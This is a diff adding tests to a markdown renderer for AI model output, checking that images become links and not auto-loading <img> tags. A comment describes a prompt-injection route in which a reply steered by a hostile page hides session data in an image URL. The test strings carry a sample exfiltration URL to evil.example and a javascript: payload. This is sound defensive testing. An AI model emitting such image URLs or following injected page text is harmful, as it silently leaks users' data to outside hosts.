@@ -52,6 +52,17 @@ for (const [i, src] of hostile.entries()) {
   check(`hostile ${i} has no <iframe`, !out.includes('<iframe'));
 }
 
+// --- a markdown image in model output is not fetched by itself -------------
+// An <img> loads the moment it is drawn: a reply steered by a hostile page
+// could put what the session read into the URL of an image, and the
+// browser would send it off with no click. The image becomes a link.
+for (const fin of [false, true]) {
+  const out = render('look: ![chart](https://evil.example/c.png?d=SECRET)', fin);
+  check(`image is not drawn as <img> (final=${fin})`, !out.includes('<img'), out);
+  check(`image stays reachable as a link (final=${fin})`, out.includes('href="https://evil.example/c.png?d=SECRET"') && out.includes('chart'), out);
+}
+check('image with a javascript: src is not a link', !/href="javascript:/i.test(render('![x](javascript:alert(1))', true)));
+
 // --- the pill regression: inline code never crosses a line ----------------
 const pillCase = '` lone\nnext line of prose\n` another\n`third';
 for (const fin of [false, true]) {
